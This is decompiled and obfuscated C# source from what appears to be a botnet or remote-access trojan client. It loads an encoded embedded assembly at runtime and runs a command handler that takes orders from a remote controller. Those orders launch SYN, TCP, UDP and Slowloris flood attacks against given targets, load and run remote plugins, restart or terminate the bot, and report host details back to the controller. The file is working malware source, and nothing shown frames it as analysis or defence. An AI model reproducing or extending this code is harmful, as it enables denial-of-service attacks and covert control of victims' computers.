		return Assembly.Load(Encoding.GetEncoding(1252).GetBytes(Class10.smethod_3("iZbMPD88PDxAPDw8Ozs8PPQ8PDw8PDw8fDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8vDw8PEpb9ko88EUJXfQ9iAldkKSlr1ysrqujrp2pXJ+dqqqrsFyeoVyusapcpapcgIuPXKmroKFqSUlGYDw8PDw8PDyMgTw8iD0/PHcKyIo8PDw8PDw8PBw8Pl1HPUQ8PFg8PDxCPDw8PDw8ynY8PDxcPDw8fDw8PDx8PDxcPDw8Pjw8QDw8PDw8PDxAPDw8PDw8PDy8PDw8Pjw8PDw8PD88fME8PEw8PEw8PDw8TDw8TDw8PDw8PEw8PDw8PDw8PDw8PHx2PDyHPDw8PHw8PLw/PDw8PDw8PDw8PDw8PDw8PDw8PJw8PEg8PDzkdTw8WDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8XDw8RDw8PDw8PDw8PDw8RFw8PIQ8PDw8PDw8PDw8PGqwobSwPDw80FY8PDxcPDw8WDw8PD48PDw8PDw8PDw8PDw8PFw8PJxqrq+unzw8PLw/PDw8fDw8PEA8PDxaPDw8PDw8PDw8PDw8PDx8PDx8aq6hqKufPDxIPDw8PJw8PDw+PDw8Xjw8PDw8PDw8PDw8PDw8fDw8fjw8PDw8PDw8PDw8PDw8PDysdjw8PDw8PIQ8PDw+PEE85GE8PDxQPDw9PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PJI+ZE08PEY8PD6vTjw8RrlFPDxAPGY8PE9sPzyVPDw8PTw8TTyvTzw8RrxHPDxAr1A8PEa8Rjw8QLpGPDxAukc8PEA+q1E8PEY8ukc8PECrUjw8Rjy6Rzw8QKtTPDxGRrpHPDxAq1Q8PEY8ULxHPDxAULxGPDxAQkdnPENmPDw8T2w+PI88PDw+PDxNPD6vVTw8RrxHPDxAr1A8PEa8Rjw8QLpGPDxAukc8PECrVjw8RrFDPDw+RrpHPDxAq1I8PEY8ukc8PECrVDw8RjxQvEc8PEBQvEY8PEBCR2c8Q2ZaPmRNPDxGZjxPbD08Rzw8PD88PE0+t048PEBGZzxCZl4+P7lOPDxAZk9sPTxHPDw8QDw8TT63Tzw8QEZnPEJmXj4/uU88PEBmT2w/PIY8PDxBPDxNPD5kWDw8RmRZPDxGDFI8PD1kWjw8RlOrWzw8RkZCyqVSOj5SOj1IRGlSPEJS1rBSPDw9q1w8PEavXTw8RkdnRLpePDxGR2c8Q2ZGPGY8PDxPbD88bDw8PEI8PE0+t0g8PEBGQkdDP2RfPDxGsEg8PD1IPrhIPDxARENkPTw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEI8PE0+t0g8PEBGQkdDP2RhPDxGsEg8PD1IPrhIPDxARENkPTw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEI8PE0+t0k8PEBGQkdDP2RfPDxGsEg8PD1IPrhJPDxARENkPTw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEI8PE0+t0k8PEBGQkdDP2RhPDxGsEg8PD1IPrhJPDxARENkPTw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEI8PE0+t0o8PEBGQkdDP2RfPDxGsEg8PD1IPrhKPDxARENkPTw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEI8PE0+t0o8PEBGQkdDP2RhPDxGsEg8PD1IPrhKPDxARENkPTw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEM8PE0+t0s8PEBGQkdDP2RfPDxGsD88PD5IPrhLPDxARENkPjw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEM8PE0+t0s8PEBGQkdDP2RhPDxGsD88PD5IPrhLPDxARENkPjw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEQ8PE0+t0w8PEBGQkdDP2RfPDxGsD48PD5IPrhMPDxARENkPzw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEQ8PE0+t0w8PEBGQkdDP2RhPDxGsD48PD5IPrhMPDxARENkPzw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEU8PE0+t008PEBGQkdDP2RfPDxGsEA8PD5IPrhNPDxARENkQDw8Z0ZCQzo9Ujo9SUVpFGZPbD88bDw8PEU8PE0+t008PEBGQkdDP2RhPDxGsEA8PD5IPrhNPDxARENkQDw8Z0ZCQzo9Ujo9SUVpFGZPbD88gDw8PEY8PE08P0ZCUmo+Z1k+t0s8PEBQOj1HQ2lKPrdLPDxAPkCrQjw8QjxnWT63TDw8QFA6PUdDaUo+t0w8PEA+QKs+PDxCPGc8Zk9sPzxZPDw8Rzw8TTw+t008PEBQOj1GQmlKPrdNPDxAPj+rRjw8QjxmPDw8T2w/PFk8PDxHPDxNPD63SDw8QFA6PUZCaUo+t0g8PEA+UKtiPDxGPGY8PDw/bD88hDw8PDw8PDw8PrdIPDxAUFCrYjw8Rjw+t0k8PEBQUKtiPDxGPD63Sjw8QFBQq2I8PEY8PrdMPDxAUFCrPjw8Qjw+t008PEBQUKtGPDxCPGZaPmRNPDxGZn6Phn49PD08PDw8PEg8PDyybmpsanFsc25zPDw8PEE8qDw8PEBFPDxfujw8rEU8PBxDPDxfj7Cupaqjrzw8PDyMTTw8RDw8PF+RjzyUTTw8TDw8PF+DkYWAPDw8pE08PNQ+PDxffqirnjw8PDw8PDw+PDw9k1nyRUVEPDw8NmFvPFI8PD08PDxhPDw8RTw8PE88PDxuPDw8bTw8PGI8PDxAPDw8Tzw8PEc8PDw9PDw8Qjw8PD08PDxIPDw8Vjw8PD08PDw9PDw8Pjw8PEA8PDw8PEY8PTw8PDw8QjzSPMs8QjzkPMs8QjzpPMs8Qjz9PMs8QjwKPMs8QjxYPcs8QjyDPWg9Qjy+PY89QjzbPdE9QjyYPss8RjzBPqw+QjwVPss8QjwzQCFAQjxKQSFAQjxnQSFAQjyGQSFAQjyfQSFAQjy4QSFAQjzTQSFAQjzuQSFAQjwmQQdBQjw6QQdBQjxIQiFAQjxhQiFAQjyRQn5CozylQjw8QjzUQrRCQjz0QrRCQjwSQss8QjwoQtE9QjxFQ7RCQjxgQ8s8QjxtQyFAQjyCQ8s8QjzKQ8s8QjzsQ9tDQjwPQ8s8PDw8PD08PDw8PD08PTw9PTw8UjxlPEE8PTw9PD09PDxsPGU8QTw9PEE8PT08PH48ZTxBPD08RTw9PTw8kzxlPEU8PTxJPD09PDyfPGU8RTxAPEk8PVxMPKQ8ZTxJPEM8STw9PEw8rzxlPEk8RjxKPL08TDy6PGU8STxIPE08QkIuPGY8krw2PGk8krw7PGk8QkIuPGY8krxDPXc8krxKPXc8QjxRPXs8QjxdPX48QjyKPYI8TTzOPY08TTzoPZE8PTwiPto8PTxjP9o8PTyGP9o8PTypP+Q8PTzGP+48PTzmP/g8PTwnPwo8PTxKQA48PDw8PD88wlTwPEY8PTw8PDw8PzwCPfY8TDw/PDw8PDw/PAI9GDxUPEE8PDw8PD88Aj0kPGA8RTw8PDw8PzzCVPA8RjxGPDw8PDw/PAI99jxMPEg8PDw8PD88Aj0YPFQ8Sjw8PDw8PzwCPSQ8YDxOPDw8PDw/PMJU8DxGPE88PDw8PD88Aj32PEw8UTw8PDw8PzwCPRg8VDxTPDw8PDw/PAI9JDxgPFc8jFw8PDw8wlTwPIk8WDykXDw8PDzSPOs9lTxYPAxcPDw8PNI89T2cPFk8a108PDw8wlTwPIk8Wjw8PDw8PDwCSQE9ozxaPDw8PDw8PAJJCj2jPFo8PDw8PDw8AkkaPaM8Wjw8PDw8PDwCSSU9pzxaPDw8PDw8PAJJNj2sPFo8PDw8PDw8AklOPqw8Wjw8PDw8PDwCSWA+rDxaPHRdPDw8PMJEbD6wPFo8i108PDw8wkSCPrU8Wjw8PDw8PDwCSaA+uzxbPDw8PDw8PAJJxj7APFs8lF08PDw8wkTUPsU8WzyrXTw8PDzCROQ+yTxbPLRdPDw8PMJE9D7OPFw8PDw8PDw8AkH9Pok8XDw8PDw8PDwCQQg+0zxcPApdPDw8PAI9ED7JPF48EF08PDw8wkQ0Pt48XzxMXjw8PDzCREo/3jxgPIhePDw8PMJEaz/ePGE8xF48PDw8wkR3P948YjwAXjw8PDzCRI4/3jxjPDxfPDw8PMJEmj/ePGQ8eF88PDw8wkSvP+g8ZTy0Xzw8PDzCRLk/6DxmPPBfPDw8PMJEzT/yPGc8LF88PDw8wkTYP/I8aDxoYDw8PDzCRO8//DxpPKRgPDw8PMJE/D/8PGo84GA8PDw8wjwMPwI8azwwYDw8PDzCPBE/tTxtPFxhPDw8PMI8HD+JPG48iGE8PDw8vTwlP4k8bjzcYTw8PDzAVPA8iTxuPDw8PTzeQDw8PjzlQDw8PTzsQDw8PjwlPzw8PTzsQDw8PjwlPzw8PzzzQDw8QDzeQDw8PTz8QDw8PTzeQDw8PjzlQDw8PTzsQDw8PjwlPzw8PTzsQDw8PjwlPzw8PzzzQDw8QDzeQDw8PTz8QDw8PTzeQDw8PjzlQDw8PTzsQDw8PjwlPzw8PTzsQDw8PjwlPzw8PzzzQDw8QDzeQDw8PTz8QDw8PTwDQDw8PTwIQDw8PTwKQDw8PTwKQDw8PTwQQDw8PjwlPzw8PTwQQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwKQDw8PTwcQDw8PjwlPzw8PTwlP6U88Dw2PK088Dw2PLU88Dw2PL088Dw2PMU88Dw2PM088Dw2PNU88Dw2PN088Dw2POU88Dw7PO088Dw2PPU88Dw2PP088Dw2PAU88DxAPRU88DxGPR088DyJPCU88DyJPFU88DyJPEg88DyJPIU88DyJPH088DyJPH086z1RPS08L0KJPIU8NUJYPS08PUOJPIU88DxkPX089T1qPTU88DyJPFU8ZUOAPUU9dkOGPT09lEOPPUU9pkOYPe08ukOjPG088Dw2PG08xEN+PFU900OpPV09+EO1PVU9CEOpPZ089jwIPUQ8RDxtPEQ8SDxyPEQ8UDxtPEQ8VDxyPGo8Xzw9Pmo8tzyyPmo8bzxKPmo8rzypPmo8RzwQPWo8TzwcPWo8Vzw3PWo8ZzwQPWo8dzw3PWo8hzw3PWo8jzxpPmo8nzyTPmo8pzygPn0+FzxyPJ0+FzxyPDw/FzxyPFw/FzxyPLw/FzxyPNw/FzxyPF09cD13PXw9oT3HPdY95T30Pf49BD1FPD08PDwiPm08PDxjP208PDyGP208PDypP0g8PDzGP0Q8PDzmP0w8RTw9PDw8Z0ARPDw8bEARPDw8eEARPDw8f0AVPDw8jEAaPDw8oEAaPDw8rkAaPDw8tkAePDw8mD4jPDw8yEAoPDw80kAtPDw8WD0xPEw8Xzw+PEQ8Xjw+PD48TTw/PEw8YTxAPEQ8YDxAPD48TjxBPEQ8YjxCPEw8YzxCPD48TzxDPEw8ZTxEPEQ8ZDxEPD48UDxFPEw8ZzxGPEQ8ZjxGPD48UTxHPEw8aTxIPEQ8aDxIPD48UjxJPD48UzxLPD48VDxNPD08VTxNPD48VjxPPD48VzxRPD08WTxTPD48WDxTPD48WjxVPEs9QLw8PD08PDw8PDw8PDw8PDw8ujw8PD48PDw8PDw8PDw8PD08wjw8PDw8Pjw8PDw8PDw8PDw8PTysPjw8PDyFPMI9hTzRPYU84D2FPO89PDw8eImroLGooXo8hYyosaOlqmqgqKg8i7GwrLGwgbKhqrCEnaqgqKGuPIyosaOlqjyFqqyxsIGyoaqwhJ2qoKihrjyOoZ+hpbKhoIGyoaqwhJ2qoKihrjyMqLGjpaqPsJ2woTyPpaChPIyosaOlqn2uo688j6GupZ2opbahrjyFjKixo6WqPKmvn6uuqKWePI+1r7ChqTyJsaiwpZ+dr7CAoaiho52woTyBqrGpPIuepqGfsDxqn7CrrjyFqrKrp6E8hX2vtaqfjqGvsaiwPH2vtaqff52oqJ6dn6c8fqGjpaqFqrKrp6E8PJJwSoGqoIWqsqunoTyynaixoZubPIqLioE8jpGKioWKgzx/iIWBipA8j4GOkoGOPIShnaChrjyDsaWgPIyosaOlqoOxpaA8j7WvsKGpan+rqKihn7Clq6qvaoOhqqGupZ88iKWvsJxtPICdsJ08j7WvsKGpao6xqrClqaFqj6GupZ2opbadsKWrqmqCq66pnbCwoa6van6lqp2utTx+paqdrrWCq66pnbCwoa48nqI8j7WvsKGpaoWLPImhqauutY+wrqGdqTyprzyPoa6lnailtqE8gKGvoa6lnailtqE8o6Gwm4qdqaE8o6Gwm4Chr5+upaywpauqPKOhsJt9sbCkq648o6Gwm3+xrq6hqrCPsJ2woTyjobCbj7CrrIuqgKWvn6uqqqGfsKWrqjyjobCbgbShn7GwoYuqiKudoDyjobCbhJ2vgquuqTyjobCbgbShn7GwoYuqiKudoH2uo688r6Gwm4G0oZ+xsKGLqoirnaB9rqOvPJKhrq+lq6o8o6Gwm5Khrq+lq6o8j7WvsKGpapOlqqCrs69qgquuqa88gquuqTyjobCbhaqssbCCq66pPKOhsJuPsJ2woYuepqGfsDyvobCbj7CdsKGLnqahn7A8o6Gwm4OxpaA8haqlsKWdqKW2oTyBtKGfsbChPI+wq6w8gbKhqrCEnaqgqKGuPIG0oZ+xsKWrqn+rqayoobChPJ2goJuBtKGfsbClq6p/q6msqKGwoTyuoamrsqGbgbShn7Gwpauqf6uprKihsKE8j7CdrrChoDydoKCbj7CdrrChoDyuoamrsqGbj7CdrrChoDyPsKusrKGgPJ2goJuPsKusrKGgPK6hqauyoZuPsKusrKGgPIWqrLGwPJ2goJuFqqyxsDyuoamrsqGbhaqssbA8i7GwrLGwPJ2goJuLsbCssbA8rqGpq7Khm4uxsKyxsDyOoZ+hpbKhoDydoKCbjqGfoaWyoaA8rqGpq7Khm46hn6GlsqGgPI+hqqA8i6qOoZ+hpbKhoDyBtKGfsbChoDyhPHiBtKGfsbChi6qIq52gfa6jr3qnm5t+nZ+npaqjgqWhqKA8eI+wnbChi56moZ+weqebm36dn6elqqOCpaGooDyKnamhPIChr5+upaywpauqPH2xsKSrrjx/sa6uoaqwj7CdsKE8j7CrrIuqgKWvn6uqqqGfsKWrqjyBtKGfsbChi6qIq52gPISdr4Krrqk8gbShn7GwoYuqiKudoH2uo688haqssbCCq66pPI+wnbChi56moZ+wPKuepqGfsDypobCkq6A8r6GqoKGuPJ+dqKienZ+nPK6hr7GosDydrqOvPJ48sp2osaE8r7CdsKGLnqahn7A8r6WgoTyPta+woalqjqGiqKGfsKWrqjx9r6+hqZ6otZClsKihfbCwrqWesbChPH2vr6Gpnqi1gKGvn66lrLClq6p9sLCupZ6xsKE8fa+voameqLV/q6qipaOxrp2wpauqfbCwrqWesbChPH2vr6Gpnqi1f6uprJ2qtX2wsK6lnrGwoTx9r6+hqZ6otYyuq6Cxn7B9sLCupZ6xsKE8fa+voameqLV/q6y1rqWjpLB9sLCupZ6xsKE8fa+voameqLWQrp2goamdrqd9sLCupZ6xsKE8fa+voameqLV/saiwsa6hfbCwrqWesbChPI+1r7ChqWqOsaqwpamhaoWqsKGuq6yPoa6ypZ+hrzx/q6mSpa+lnqihfbCwrqWesbChPIOxpaB9sLCupZ6xsKE8fa+voameqLWSoa6vpauqfbCwrqWesbChPH2vr6Gpnqi1gqWooZKhrq+lq6p9sLCupZ6xsKE8j7WvsKGpaoClnaOqq6+wpZ+vPIChnrGjo52eqKF9sLCupZ6xsKE8gKGesaOjpaqjiaugoa88j7WvsKGpao6xqrClqaFqf6uprKWooa6Poa6ypZ+hrzx/q6mspaidsKWrqo6hqJ20nbClq6qvfbCwrqWesbChPI6xqrClqaF/q6msnbClnqWopbC1fbCwrqWesbChPI+hrqWdqKW2nZ6ooX2wsK6lnrGwoTyPsK6hnak8f6irr6E8kKt9rq6dtTyApa+sq6+hPH+rqaylqKGug6Gqoa6dsKGgfbCwrqWesbChPJC1rKE8g6GwkLWsoTx9r6+hqZ6otTyDobB9r6+hqZ6otTyOsaqwpamhkLWsoYSdqqCooTyDobCQtayhgq6rqYSdqqCooTyDobB/sa+wq6l9sLCupZ6xsKGvPKOhsJuSnaixoTyBqaywtTyAoaiho52woTx/q6mepaqhPI+1r7ChqWqQpK6hnaClqqM8haqwoa6oq5+noaA8f6uprJ2uoYG0n6SdqqOhPI6hqauyoTyBsqGqsH2uo688PDw8PD9cPDw8PDwQWesgigzmfdRb52CkaXJ+PETztpiSVXAcxUFcPj1YVENcPj1OYE5YR1xATk1OYE5YTlFYQVw9PU5NPkJEP0JNUEA8PDw8QD08PDw/Qk1UPkJKP0JNVUJCUU5ZPVg/XDw9P0JOXT9CTmFCPD1ZQU5YQjw9TlhZQT9cPEpAXDxNUD9cPD5AXDxOWEFcPT1OWEBcPE5lQFw8Tmk/XDxYQFw9PVhAXDxNVUJcPj1YTlg/Qk5tQVw9PU5tP0JOSEFcPT1OSD9CTkRBXD09TkQ/Qk5MQVw9PU5MQ1w+PU1UTlg/Qk5YPkJYP2Q8SkBkPE1QP2Q8PkBkPE5YQGQ8TmVAZDxOaT9kPFhAZDxNVUBcPT1KQFw9PT5BXD09TaVAXD09REFRTlk9WEJcPj1OtVhAXDxZQUJDPllBWUFBXD09WUFBXD1YTrVCQz5OWE5YQEM9Tlg/Qz1YQVw8Try9RDw9TrzBTry9RDw9Try9TbzFRFw+WVhOvL0+Q0M/WVhNVT5HPD5OvMlOvMlOvMlITD0/WjxMWjxaPFo8QEY9Tm1FQ0BObU5tTm0+QEY9TkhFQ0BOSE5ITkg+QEY9TkRFQ0BORE5ETkQ+QEY9TkxFQ0BOTE5MTkw+QUM+TVQ+P0M9PkNcPj1YTrzRRz08QoyosaOlqjw8Vj08UYqhsGmToZ2yoVyMqLGjpapcfp2voTw8QT08PDw8SD08Q7SPpaihqrA8PFo9PFV/q6y1rqWjpLBc/uVctI+lqKGqsFxubG1tPDxlPTxgc29ynXChbHFpn551oWlwnnGiaXWgoHFpbp2fcnWhop9soHV1PDxIPTxDbWpsamxqbDw8RD08Qz08PDw8RD08RDw8PDw8Wj08PTyQPlKTrp2siquqgbSfoaywpauqkKSuq7OvPTw8PDw8PDx3CsiKPDw8PD48PDy2PDw8AHU8PABXPDyOj4CPrLPE+jaoPIm/8ElHoGav7T48PDx/dpiRr6Gur5iKnbCknaqYgKufsamhqrCvmJKlr7GdqFyPsLGgpatcbmxtbJiMrqumoZ+wr5iMrqumoZ+wXICAq4+hrpiMqLGjpaqYq56mmIChnrGjmIWMqLGjpapqrKCePDw8pHY8PDw8PDw8PDw8unY8PDxcPDw8PDw8PDw8PDw8PDw8PDw8PDw8PKx2PDw8PDw8PDybf6uugKioiZ2lqjypr5+rrqGhaqCoqDw8PDw8O2E8XHw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PTxMPDw8VDw8vDw8PDw8PDw8PDw8PDw8PTw9PDw8bDw8vDw8PDw8PDw8PDw8PDw8PTw8PDw8hDw8PJR8PDxgPzw8PDw8PDw8PDxgP3A8PDySPI88mzySPIE8jjyPPIU8izyKPJs8hTyKPII8izw8PDw8+UArOjw8PTw8PD08PDw8PDw8PTw8PDw8ezw8PDw8PDxAPDw8Pjw8PDw8PDw8PDw8PDw8PIA8PDw9PJI8nTyuPII8pTyoPKE8hTyqPKI8qzw8PDw8YDxAPDw8kDyuPJ08qjyvPKg8nTywPKU8qzyqPDw8PDw8POxAwD48PD08jzywPK48pTyqPKM8gjylPKg8oTyFPKo8ojyrPDw8nD48PD08bDxsPGw8bDxsPHA8njxsPDw8gDxSPD08fzyrPKk8qTyhPKo8sDyvPDw8ijyhPLA8aTyTPKE8nTyyPKE8XDyMPKg8sTyjPKU8qjxcPH48nTyvPKE8PDxsPEQ8PTx/PKs8qTysPJ08qjy1PIo8nTypPKE8PDw8PLQ8jzylPKg8oTyqPLA8PDx0PEM8PTyCPKU8qDyhPIA8oTyvPJ88rjylPKw8sDylPKs8qjw8PDw8jDyoPLE8ozylPKo8PDw8PGw8RDw9PII8pTyoPKE8kjyhPK48rzylPKs8qjw8PDw8bTxqPGw8ajxsPGo8bDw8PHQ8SDw9PIU8qjywPKE8rjyqPJ08qDyKPJ08qTyhPDw8hTyMPKg8sTyjPKU8qjxqPKA8qDyoPDw8lDxVPD08iDyhPKM8nTyoPH88qzysPLU8rjylPKM8pDywPDw8fzyrPKw8tTyuPKU8ozykPLA8XDzlPFw8tDyPPKU8qDyhPKo8sDxcPG48bDxtPG08PDw8PHw8SDw9PIs8rjylPKM8pTyqPJ08qDyCPKU8qDyhPKo8nTypPKE8PDyFPIw8qDyxPKM8pTyqPGo8oDyoPKg8PDxsPEM8PTyMPK48qzygPLE8nzywPIo8nTypPKE8PDw8PIw8qDyxPKM8pTyqPDw8PDxwPEQ8PTyMPK48qzygPLE8nzywPJI8oTyuPK88pTyrPKo8PDxtPGo8bDxqPGw8ajxsPDw8dDxEPD08fTyvPK88oTypPJ48qDy1PFw8kjyhPK48rzylPKs8qjw8PG08ajxsPGo8bDxqPGw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8bDw8SDw8PMx2PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PDw8PA==", bool_0: true)));
	}

	private static void smethod_7(string string_1)
	{
	}

	private static void smethod_8(object sender, EventArgs2 e)
	{
		//IL_045d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0463: Invalid comparison between Unknown and I4
		Class9 @class = sender as Class9;
		try
		{
			Class0 class2 = new Class0(e.Byte_0);
			switch (e.Enum2_0)
			{
			case Class9.Enum2.const_1:
				if (Class2.Boolean_0)
				{
					@class.method_9(Class2.String_0 + " Flood Already Active");
					return;
				}
				Class2.smethod_0(Class2.Enum0.const_1, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class2.smethod_1();
				@class.method_9("SYN Flood Active");
				break;
			case Class9.Enum2.const_2:
				if (Class2.Boolean_0)
				{
					@class.method_9(Class2.String_0 + " Flood Already Active");
					return;
				}
				Class2.smethod_0(Class2.Enum0.const_0, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class2.smethod_1();
				@class.method_9("TCP Flood Active");
				break;
			case Class9.Enum2.const_3:
				if (Class2.Boolean_0)
				{
					@class.method_9(Class2.String_0 + " Flood Already Active");
					return;
				}
				Class2.smethod_0(Class2.Enum0.const_2, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class2.smethod_1();
				@class.method_9("UDP Flood Active");
				break;
			case Class9.Enum2.const_4:
				if (Class2.Boolean_0)
				{
					Class2.smethod_2();
					@class.method_9(Class2.String_0 + " Flood Inactive");
				}
				else
				{
					@class.method_9("No Flood Active");
				}
				break;
			case Class9.Enum2.const_5:
			{
				object[] parameter2 = new object[2]
				{
					class2.ReadString(),
					sender
				};
				new Thread(smethod_16).Start(parameter2);
				break;
			}
			case Class9.Enum2.const_6:
			{
				object[] parameter = new object[3]
				{
					class2.ReadString(),
					class2.ReadString(),
					sender
				};
				new Thread(smethod_17).Start(parameter);
				break;
			}
			case Class9.Enum2.const_7:
				try
				{
					Class1.smethod_1();
					@class.method_10(bool_2: false);
					Process.Start(Process.GetCurrentProcess().MainModule!.FileName);
					Process.GetCurrentProcess().Kill();
				}
				catch
				{
					(sender as Class9).method_9("Restart Failed");
				}
				break;
			case Class9.Enum2.const_8:
			{
				string @string = Encoding.Default.GetString(e.Byte_0);
				if (@string != Encoding.Default.GetString(Class10.smethod_1(Convert.FromBase64String(Class5.string_10), bool_0: false)))
				{
					(sender as Class9).method_9("Invalid password");
					return;
				}
				if (Class5.bool_0)
				{
					foreach (GClass2 item in list_0)
					{
						item.method_3();
					}
					Class7.smethod_4();
				}
				Process.GetCurrentProcess().Kill();
				break;
			}
			case Class9.Enum2.const_9:
				try
				{
					if (GClass0.smethod_3(Encoding.GetEncoding(1252).GetBytes(class2.ReadString())))
					{
						string text = GClass0.sortedList_1.Values[GClass0.sortedList_1.Count - 1].get_Name() + " Stored";
						if (Class5.bool_0)
						{
							text += " and Saved";
							GClass0.smethod_0();
						}
						@class.method_9(text);
						break;
					}
					throw new Exception(GClass0.smethod_6());
				}
				catch (Exception)
				{
					@class.method_9("Plugin Error: Invalid or Already Loaded");
				}
				break;
			case Class9.Enum2.const_10:
				try
				{
					PluginArgs val = Serializer.Deserialize(e.Byte_0);
					if (!GClass0.sortedList_1.ContainsKey(val.PluginGuid))
					{
						@class.method_9("Plugin not found");
						break;
					}
					IPlugin iplugin_ = GClass0.sortedList_1[val.PluginGuid];
					GClass0.smethod_7(sender, iplugin_, val);
				}
				catch (Exception ex)
				{
					@class.method_9("Failed Plugin Execution: " + ex.Message);
				}
				break;
			case Class9.Enum2.const_11:
				try
				{
					Guid guid = new Guid(class2.ReadString());
					for (int i = 0; i < GClass0.sortedList_1.Count; i++)
					{
						if (GClass0.sortedList_1.Keys[i] == guid && (int)GClass0.sortedList_1.Values[i].get_CurrentState() == 1)
						{
							GClass0.sortedList_1.Values[i].Stop(sender);
							break;
						}
					}
				}
				catch
				{
					@class.method_9("Failed to stop plugin");
				}
				break;
			case Class9.Enum2.const_13:
				bool_0 = true;
				break;
			case Class9.Enum2.const_17:
				@class.method_10(bool_2: true);
				break;
			default:
				@class.method_9("Broken\\Invalid Header");
				break;
			case Class9.Enum2.const_19:
				bool_1 = true;
				int_0 = BitConverter.ToInt32(e.Byte_0, 0);
				@class.method_10(bool_2: true);
				break;
			case Class9.Enum2.const_20:
				if (Class2.Boolean_0)
				{
					@class.method_9(Class2.String_0 + " Flood Already Active");
					return;
				}
				Class2.smethod_0(Class2.Enum0.const_3, class2.ReadString(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), class2.ReadInt32(), @class);
				Class2.smethod_1();
				@class.method_9("Slowloris Flood Active");
				break;
			}
			class2.Close();
		}
		catch
		{
		}
	}

	private static void smethod_9(object sender, EventArgs e)
	{
		Class9 @class = (Class9)sender;
		Class12 class2 = new Class12();
		class2.Write(Class13.smethod_1());
		class2.Write(Class3.smethod_0());
		class2.Write(Class5.string_7);
		class2.Write(Class10.smethod_3(@class.String_1, bool_0: true));
		class2.Write(Class5.string_11);
		byte[] data = class2.method_0();
		@class.method_7(new Class8(Class9.Enum2.const_15, data).method_0());
		@class.method_3();
		Class6.smethod_0(@class);
		class2 = null;
		data = null;
	}

	private static void smethod_10(object sender, EventArgs e)
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Invalid comparison between Unknown and I4
		Class9 @class = (Class9)sender;
		Class6.smethod_1(@class);
		@class.method_11();
		if (bool_0)
		{
			Thread.Sleep(TimeSpan.FromSeconds(30.0));
			bool_0 = false;
		}
		else if (bool_1)
		{
			Thread.Sleep(TimeSpan.FromSeconds(int_0));
			int_0 = 0;
			bool_1 = false;
		}
		if (GClass0.sortedList_1.Count > 0)
		{
			foreach (IPlugin value in GClass0.sortedList_1.Values)
			{
				if ((int)value.get_CurrentState() == 1 && value.get_StopOnDisconnection())
				{
					value.Stop(sender);
				}
			}
		}
		@class.method_0();
	}

